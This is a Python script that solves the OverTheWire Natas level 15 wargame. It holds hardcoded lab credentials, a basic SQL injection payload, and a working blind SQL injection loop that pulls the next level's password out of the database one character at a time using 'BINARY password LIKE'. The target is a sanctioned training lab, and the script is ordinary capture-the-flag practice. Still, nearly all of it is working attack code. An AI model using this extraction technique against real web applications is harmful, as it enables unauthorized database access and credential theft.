import requests
import re

user = 'natas15'
passw = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://%s.natas.labs.overthewire.org/' % user



# 1st step:  print the sourcecode
#'''
response = requests.get(url, auth=(user, passw))
print(response.text)
#'''
# search bar, okay



# 2nd step:  sql injection
#'''
response = requests.post(url, auth=(user, passw), data={ "username" : '" or 1=1 # '})
print(response.text)
#'''

# 3rd step: see if natas16 exists in the database
#'''
response = requests.post(url, auth=(user, passw), data={ "username" : 'natas16'})
print(response.text)
#'''


# 4th step:
#'''
import string
chars = string.printable

cracked_password = []
while (len(cracked_password) < 32):  # we know the lengths of the passwords are 32, but if not, we can change this easily

	for char in chars:  # trying for every possible char from our printable characters list

		print("trying the password: ", "".join(cracked_password) + char)  # printing the current trial, because it's too fun to watch in terminal, seriously, that's the only reason

		response = requests.post(url, data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(cracked_password) + char + '%" # ' },auth = (user, passw))

		webPage = response.text

		if ( 'user exists' in webPage ):  # user exist means, our query has evaluated to true
			cracked_password.append(char)  # so we know that our current trial was successful
			break  # break the loop for this digit, we already figured it out

print("".join(cracked_password))  # printing the full password
#'''
